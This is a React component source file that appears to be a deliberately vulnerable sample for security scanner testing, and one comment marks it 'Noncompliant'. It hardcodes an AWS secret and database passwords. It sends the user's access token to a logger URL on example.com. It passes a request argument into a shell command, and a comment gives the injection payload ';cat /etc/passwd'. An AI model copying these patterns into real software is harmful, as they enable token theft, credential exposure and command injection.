import React from 'react'
import logo from './logo.svg'
import './App.css'
import { getLocation } from './Location'
import process from 'process'
import { Client } from 'pg'
function App() {
  const { hostname, pathname } = getLocation()
  console.log('A')
  console.log('B')
  const AWS_SECRET_ACESS_KEY = '21321dshiushIPQBN!I@#ibdbsdsa'
  const teste = {
    login: 'douglas',
    password: 'teste.js',
  }
  console.log(teste)
  const db = localStorage.setItem('DBBASE', process?.env?.AWS_SECRET_ACESS_KEY)
  console.log(db)
  if (
    process?.env?.AWS_SECRET_ACESS_KEY &&
    process?.env?.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY &&
    AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY
  ) {
    alert('Unexpected Condition')
    fetch(
      'http://example.com/logger.php?token=' + localStorage?.access_token,
    ).then((response) => {
      localStorage.setItem('teste', response?.body)
      console.log({ localStorage })
    })
  }

  function teste555(req, res) {
    console.log(res)
    const cmd = 'ls ' + req.query.arg
    const { Client } = require('pg')
    const client = new Client({
      host: process?.env?.NODE_ENV,
      port: 5334,
      user: 'database-user',
      password: 'secretpassword!!',
    })
    client.connect((err) => {
      if (err) {
        console.error('connection error', err.stack)
      } else {
        console.log('connected')
      }
    })
    const out = process?.execSync(cmd) // Noncompliant: example of a command injection, req.query.arg = -la . ;cat /etc/passwd
    console.log(out)
    console.log(db)
    return ''
  }
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <p data-cy="location">
          {hostname} {pathname}{' '}
        </p>
      </header>
    </div>
  )
}

export default App
